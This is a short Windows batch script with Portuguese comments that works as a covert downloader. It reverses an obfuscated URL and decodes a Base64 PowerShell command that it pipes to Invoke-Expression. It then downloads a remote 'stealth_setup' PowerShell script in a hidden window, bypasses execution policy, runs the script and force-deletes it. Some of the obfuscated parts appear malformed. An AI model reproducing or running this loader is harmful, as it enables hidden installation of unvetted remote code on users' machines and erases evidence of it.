@echo off
setlocal EnableDelayedExpansion

:: Gerar nome aleatório para o arquivo PowerShell
set "nAme=%random%%random%"
set "tmpPS1=%TEMP%\!nAme!.ps1"

:: URL codificada reversa (altere a URL se necessário)
set "revURL=1sp.pustes_hptes/moc.buhtig.buhtig//:sptth"
set "uRL="

:: Reverter URL
for /L %%i in (0,1,60) do (
    set "char=!revURL:~%%i,1!"
    if defined char set "uRL=!char!!uRL!"
)

:: Comando PowerShell ofuscado
set "payload=IElFWHByZXNzaW9ucG9saWN5IEJ5cGFzcyAtRmlsZSAidGVtcDpcXCEhbmFtZSEhLnBzMSIK"

:: Decodificar payload e executar (Download + Exec + AutoDelete)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%payload%')) | iex"

:: Baixar o stealth_setup.ps1
powershell -NoP -NonI -W Hidden -Command "(New-Object Net.WebClient).DownloadFile('%uRL%', '%tmpPS1%'); Start-Sleep -s 2; powershell -NoP -W Hidden -Exec Bypass -File '%tmpPS1%'; Remove-Item '%tmpPS1%' -Force"
